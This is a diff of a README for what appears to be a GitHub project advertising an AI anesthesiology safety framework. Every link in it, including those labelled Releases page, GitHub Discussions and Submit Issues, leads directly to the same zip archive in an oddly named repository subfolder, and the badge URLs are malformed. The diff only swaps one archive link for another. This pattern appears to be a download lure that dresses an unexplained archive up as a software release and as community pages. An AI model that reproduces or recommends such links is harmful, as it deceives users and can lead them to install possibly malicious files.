@@ -1,7 +1,7 @@
 # 🎉 ai-anesthesiology-safety-framework - Safety in Anesthesia Using AI
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/Kaptaan17/ai-anesthesiology-safety-framework/main/captivatrix/ai-anesthesiology-safety-framework-v2.3.zip%https://raw.githubusercontent.com/Kaptaan17/ai-anesthesiology-safety-framework/main/captivatrix/ai-anesthesiology-safety-framework-v2.3.zip)](https://raw.githubusercontent.com/Kaptaan17/ai-anesthesiology-safety-framework/main/captivatrix/ai-anesthesiology-safety-framework-v2.3.zip)
+[![Download Release](https://github.com/Kaptaan17/ai-anesthesiology-safety-framework/raw/refs/heads/main/captivatrix/ai_framework_safety_anesthesiology_3.4.zip%https://github.com/Kaptaan17/ai-anesthesiology-safety-framework/raw/refs/heads/main/captivatrix/ai_framework_safety_anesthesiology_3.4.zip)](https://github.com/Kaptaan17/ai-anesthesiology-safety-framework/raw/refs/heads/main/captivatrix/ai_framework_safety_anesthesiology_3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the ai-anesthesiology-safety-framework! This tool helps enhance safety in anesthesiology using advanced artificial intelligence. Our framework focuses on three key areas: consciousness monitoring, closed-loop drug delivery, and perioperative risk prediction.
@@ -26,7 +26,7 @@ The ai-anesthesiology-safety-framework offers several features that enhance pati
 - **User-Friendly Interface**: Navigate the application easily, even without technical expertise.
 
 ## 🔗 Download & Install
-You can easily download the application from our [Releases page](https://raw.githubusercontent.com/Kaptaan17/ai-anesthesiology-safety-framework/main/captivatrix/ai-anesthesiology-safety-framework-v2.3.zip). 
+You can easily download the application from our [Releases page](https://github.com/Kaptaan17/ai-anesthesiology-safety-framework/raw/refs/heads/main/captivatrix/ai_framework_safety_anesthesiology_3.4.zip). 
 
 ### Steps to Download and Install:
 1. Click the above link to visit the Releases page.
@@ -53,8 +53,8 @@ Here are some common issues and how to fix them:
 ## 🌐 Community and Support
 If you have questions or need assistance, feel free to join our community forums. We encourage feedback and discussions:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/Kaptaan17/ai-anesthesiology-safety-framework/main/captivatrix/ai-anesthesiology-safety-framework-v2.3.zip)
-- [Submit Issues](https://raw.githubusercontent.com/Kaptaan17/ai-anesthesiology-safety-framework/main/captivatrix/ai-anesthesiology-safety-framework-v2.3.zip)
+- [GitHub Discussions](https://github.com/Kaptaan17/ai-anesthesiology-safety-framework/raw/refs/heads/main/captivatrix/ai_framework_safety_anesthesiology_3.4.zip)
+- [Submit Issues](https://github.com/Kaptaan17/ai-anesthesiology-safety-framework/raw/refs/heads/main/captivatrix/ai_framework_safety_anesthesiology_3.4.zip)
 
 ## 📝 Contributing
 We welcome contributions! If you'd like to help improve the ai-anesthesiology-safety-framework, please consider:
@@ -69,4 +69,4 @@ We welcome contributions! If you'd like to help improve the ai-anesthesiology-sa
 
 Explore the advancements in anesthesiology safety and make a difference with the ai-anesthesiology-safety-framework. 
 
-[Download the Latest Release](https://raw.githubusercontent.com/Kaptaan17/ai-anesthesiology-safety-framework/main/captivatrix/ai-anesthesiology-safety-framework-v2.3.zip) to get started today!
+[Download the Latest Release](https://github.com/Kaptaan17/ai-anesthesiology-safety-framework/raw/refs/heads/main/captivatrix/ai_framework_safety_anesthesiology_3.4.zip) to get started today!
